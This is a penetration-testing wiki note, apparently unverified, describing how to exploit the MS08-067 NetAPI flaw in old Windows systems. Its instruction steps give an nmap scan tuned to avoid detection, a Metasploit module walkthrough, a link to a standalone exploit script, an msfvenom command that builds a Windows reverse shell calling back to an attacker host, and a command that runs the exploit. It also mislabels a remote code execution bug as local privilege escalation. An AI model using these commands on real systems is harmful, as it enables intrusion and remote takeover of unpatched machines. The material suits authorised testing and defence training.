---
id: 65ebb506-77d0-4721-b618-996750845a57
name: MS08-067 NetAPI Privilege Escalation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:30.388147+00:00'
updated_at: '2023-04-10T20:37:52.582738+00:00'
tactics:
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
tags:
- '[[EoP - Common Vulnerabilities and Exposure]]'
- '[[MS08-067 (NetAPI)]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Exploit MS08-067 Vulnerability]]'
- '[[Generate Windows Reverse Shell Payload]]'
---

# MS08-067 NetAPI Privilege Escalation

## Summary

MS08-067 is a vulnerability in the NetAPI service in Windows that allows an attacker to execute arbitrary code with SYSTEM privileges. This vulnerability was famously exploited by the Conficker worm in 2008. The NetAPI service is used for network file and printer sharing, and is enabled by default 

## Description

# Description

MS08-067 is a vulnerability in the NetAPI service in Windows that allows an attacker to execute arbitrary code with SYSTEM privileges. This vulnerability was famously exploited by the Conficker worm in 2008. The NetAPI service is used for network file and printer sharing, and is enabled by default on Windows XP and Windows Server 2003.

To exploit this vulnerability, an attacker needs to send a specially crafted RPC request to the vulnerable system. Successful exploitation can result in the attacker gaining complete control over the system.

This procedure can be used by an attacker who has already gained initial access to a system and is looking to escalate their privileges to SYSTEM level.

## Requirements

1. Access to a vulnerable Windows system with the NetAPI service enabled

## Defense

1. Apply the latest security patches to Windows systems to prevent exploitation of this vulnerability

1. Disable unnecessary services, such as NetAPI, to reduce the attack surface

1. Implement network segmentation to limit the impact of a successful exploit

## Objectives

1. Escalate privileges to SYSTEM level

1. Gain complete control over the system

# Instructions

1. Replace <ip_netblock> with the target IP address or network range.

**Code**: [[nmap -Pn -p445 --open --max-hostgroup 3 --script s]]

> This command uses the nmap tool to scan for the presence of the SMB MS08-067 vulnerability on the target system. The -Pn flag tells nmap not to ping the host before scanning, -p445 specifies the port to scan, and --open tells nmap to only show open ports. The --max-hostgroup 3 flag limits the number of hosts scanned simultaneously to 3, which can help avoid detection. The smb-vuln-ms08-067 script checks for the presence of the MS08-067 vulnerability, which is a critical vulnerability in the SMB protocol that can allow an attacker to execute arbitrary code on the target system. This vulnerability was famously exploited by the Conficker worm in 2008. It is important to note that this command should only be used for testing purposes on systems that you have permission to scan.

2. To use this exploit, you will need to have Metasploit installed on your system. First, open Metasploit and search for the MS08-067 exploit module. Once you have found it, set the required options such as RHOST, LHOST, and PAYLOAD. Finally, run the exploit and wait for the results.

**Code**: [[MS08-067 NetAPI]]

> The MS08-067 NetAPI exploit targets a vulnerability in the Windows Server service. This vulnerability allows an attacker to remotely execute code on the target system with SYSTEM privileges. The exploit works by sending a specially crafted RPC request to the target system's Server service. The exploit has been widely used by attackers and is considered one of the most critical vulnerabilities in Windows history. It is recommended that systems vulnerable to this exploit be patched immediately.

3. To use this exploit, you will need to provide the target IP address and port number. You can also specify the payload to use for the exploit.

**Code**: [[exploit/windows/smb/ms08_067_netapi]]

> This exploit targets a vulnerability in the NetAPI service on Windows systems. By sending a specially crafted packet to the service, an attacker can execute arbitrary code on the target system with SYSTEM privileges. This can be used to gain full control of the system and steal sensitive information.

4. The MS08_067_2018.py command is used to exploit a vulnerability in the SMB protocol on Windows systems. The command requires the IP address of the target system, the version of Windows being used, and the port number to exploit. The command will attempt to gain remote access to the target system and execute the payload specified in the command. The payload can be a reverse shell or any other payload that can be executed on the target system.

**Code**: [[https://raw.githubusercontent.com/jivoi/pentest/ma]]

> The IP address of the target system is required to specify which system to exploit. The version of Windows being used is required to specify which payload to use. The port number is required to specify which port to exploit. The command will attempt to gain remote access to the target system and execute the payload specified in the command. The payload can be a reverse shell or any other payload that can be executed on the target system. The command is useful when Metasploit cannot be used or when only a reverse shell is desired.

**Command** ([[Generate Windows Reverse Shell Payload]]):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" -f py -v shellcode -a x86 --platform windows
```

**Command** ([[Exploit MS08-067 Vulnerability]]):

```bash
python ms08-067.py 10.0.0.1 6 445
```

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]

## Commands Used

- [[Exploit MS08-067 Vulnerability]]
- [[Generate Windows Reverse Shell Payload]]

## Tags

- [[EoP - Common Vulnerabilities and Exposure]]
- [[MS08-067 (NetAPI)]]
- [[Windows - Privilege Escalation]]
